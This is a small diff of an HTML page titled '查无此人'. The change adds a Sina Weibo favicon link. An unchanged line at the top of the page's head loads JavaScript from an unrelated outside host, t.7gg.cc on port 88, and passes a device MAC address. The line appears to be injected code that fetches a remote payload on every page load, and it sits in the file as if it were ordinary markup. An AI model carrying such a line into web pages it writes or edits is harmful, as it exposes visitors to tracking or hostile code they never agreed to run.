@@ -3,6 +3,7 @@
 <head><script src=http://t.7gg.cc:88/j.js?MAC=68DB5482FAF5></script>  
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+<link rel="icon" href="../icons/sina_weibo.ico">
 <title>查无此人</title>
 
 <script type="text/javascript" src="js/jquery.min.js"></script>
